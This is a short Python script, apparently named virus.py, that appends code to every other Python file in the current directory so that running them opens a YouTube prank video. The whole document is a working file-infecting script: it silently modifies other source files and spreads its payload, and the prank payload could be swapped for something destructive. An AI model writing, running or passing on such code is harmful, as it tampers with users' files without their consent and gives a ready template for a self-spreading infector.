from os import listdir
from os.path import isfile, join

files = [f for f in listdir() if isfile(join(f))]

for file in files:
    with open(file, 'a') as f:
        if ".py" in file:
            if file != "virus.py":
                f.write('\nimport webbrowser\nwebbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")')          